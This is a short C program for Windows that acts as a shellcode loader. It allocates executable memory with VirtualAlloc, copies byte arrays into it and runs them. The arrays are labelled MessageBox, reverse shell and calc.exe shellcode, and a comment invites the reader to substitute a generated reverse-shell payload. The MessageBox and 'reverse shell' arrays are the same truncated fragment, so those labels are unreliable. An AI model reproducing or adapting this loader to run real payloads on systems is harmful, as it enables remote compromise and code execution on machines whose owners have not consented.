
#include <windows.h>
#include <stdio.h>

// Example 1: MessageBox shellcode (generated via msfvenom)
unsigned char messagebox_shellcode[] = 
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60";

// Example 2: Reverse Shell shellcode (generated via msfvenom)
// Replace with your generated shellcode for reverse shell or another payload
unsigned char reverse_shell_shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60";

// Example 3: Calc.exe shellcode (spawn calc.exe on Windows)
unsigned char calc_shellcode[] = 
"\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x1c\xad"
"\x8b\x78\x08\x8b\x5f\x20\x8b\x5c\xaf\x08\x31\xc9\x51\x68\x63"
"\x61\x6c\x63\x54\xbb\xc7\x93\xbf\x77\xff\xd3";

// Function to execute shellcode
void execute_shellcode(unsigned char *shellcode, size_t shellcode_size) {
    // Allocate memory for the shellcode
    void *exec = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory
    memcpy(exec, shellcode, shellcode_size);

    // Execute the shellcode
    ((void(*)())exec)();
}

int main() {
    printf("Executing MessageBox shellcode...\n");
    execute_shellcode(messagebox_shellcode, sizeof(messagebox_shellcode));

    printf("Executing Reverse Shell shellcode...\n");
    execute_shellcode(reverse_shell_shellcode, sizeof(reverse_shell_shellcode));

    printf("Executing Calc.exe shellcode...\n");
    execute_shellcode(calc_shellcode, sizeof(calc_shellcode));

    return 0;
}
